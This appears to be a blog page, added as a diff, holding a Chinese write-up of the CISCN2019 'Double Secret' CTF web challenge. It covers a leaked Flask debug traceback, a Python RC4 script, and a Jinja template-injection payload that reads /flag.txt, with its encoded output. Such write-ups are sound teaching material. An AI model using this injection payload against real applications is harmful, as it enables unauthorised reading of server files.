@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[CISCN2019 华东南赛区]Double Secret | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[CISCN2019 华东南赛区]Double Secret</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/19
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137333.png" alt="image-20240619213707600"></p>
+<p>我们首先访问一下screct页面</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137126.png" alt="image-20240619213758089"></p>
+<p>要我们说secret，猜测是传参数secret</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192138993.png" alt="image-20240619213851969"></p>
+<p>传1进去是d</p>
+<p>传参传长一点试试</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139377.png"></p>
+<p>发现报错，在其中发现源码泄露</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139280.png" alt="image-20240619213957241"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret==None):</span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line">Open an interactive python shell in this frame        return &#x27;flag detected!&#x27;</span><br><span class="line">    return a</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们可以发现传进去的参数是被使用rc4解密了，所以我们应该将要传进去的内容进行加密</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>rc4加密脚本如上</p>
+<p>最后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
+
+<p>将其上传为secret参数</p>
+<p>得到flag</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192145367.png" alt="image-20240619214531334"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
